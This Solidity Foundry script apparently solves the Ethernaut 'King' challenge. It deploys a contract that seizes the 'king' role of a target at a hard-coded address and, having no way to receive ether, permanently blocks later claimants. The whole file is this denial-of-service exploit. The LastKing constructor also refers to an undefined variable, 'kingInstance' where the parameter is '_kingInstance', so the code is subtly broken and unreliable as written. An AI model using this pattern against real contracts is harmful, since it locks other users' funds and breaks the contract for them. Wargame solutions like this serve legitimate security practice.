pragma solidity ^0.6.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract LastKing {
    constructor(King _kingInstance) payable{
        (bool result,) = address(kingInstance).call{value: _kingInstance.prize()}("");
        require(result);
    }

}


contract KingSolution is Script {

    King public kingInstance = King(0xC2D4576Ad8b9D1a7f5c353037286bEF02af3689C);


    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        new LastKing{value: kingInstance.prize()}(kingInstance);

        vm.stopBroadcast();
    }
}
